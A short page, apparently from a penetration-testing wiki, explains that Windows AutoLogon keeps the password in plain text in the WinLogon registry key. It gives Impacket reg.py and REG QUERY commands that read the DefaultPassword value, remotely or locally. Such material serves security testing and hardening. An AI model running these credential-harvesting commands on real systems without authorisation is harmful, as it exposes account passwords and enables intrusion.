# AutoLogon Registry

## Theory

By using this feature, other users can start your computer and use the account that you establish to automatically log on. The autologon feature is provided as a convenience. However, this feature may be a security risk. If you set a computer for autologon, anyone who can physically obtain access to the computer can gain access to all the computer's contents, including any networks it is connected to. Additionally, when autologon is turned on, the password is stored in the registry in plain text. The specific registry key that stores this value can be remotely read by the Authenticated Users group.

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
[Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can be used to query registry remotely from a UNIX-like machine.

```bash
# Query all Auto logon subkeys and values
reg.py domain.local/username:password123@IP query -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" -s 

# Query Auto logon password
reg.py domain.local/username:password123@IP query -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" -v DefaultPassword
```
{% endtab %}

{% tab title="Windows" %}
We can use the REG.EXE Windows utility

```bash
# Query Auto logon password
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword

#Or force reg.exe to read the 64-bit registry location
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
```
{% endtab %}
{% endtabs %}
